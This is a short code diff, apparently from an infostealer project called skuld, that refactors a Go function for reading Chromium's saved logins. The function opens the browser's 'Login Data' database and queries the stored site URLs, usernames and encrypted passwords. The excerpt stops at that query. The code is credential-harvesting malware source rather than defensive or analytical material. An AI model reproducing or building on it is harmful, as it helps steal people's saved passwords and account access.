@@ -1,7 +1,6 @@
 package browsers
 
 import (
-	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"os"
@@ -9,24 +8,13 @@ import (
 	"path/filepath"
 
 	_ "modernc.org/sqlite"
-
-	"github.com/hackirby/skuld/utils/fileutil"
 )
 
 func (c *Chromium) GetLogins(path string) (logins []Login, err error) {
-	tempPath := filepath.Join(os.TempDir(), "login_db")
-	err = fileutil.CopyFile(filepath.Join(path, "Login Data"), tempPath)
+	db, err := GetDBConnection(filepath.Join(path, "Login Data"))
 	if err != nil {
 		return nil, err
 	}
-
-	db, err := sql.Open("sqlite", tempPath)
-	if err != nil {
-		return nil, err
-	}
-
-	defer os.Remove(tempPath)
-	defer db.Close()
 
 	rows, err := db.Query("SELECT action_url, username_value, password_value, date_created FROM logins")
 	if err != nil {
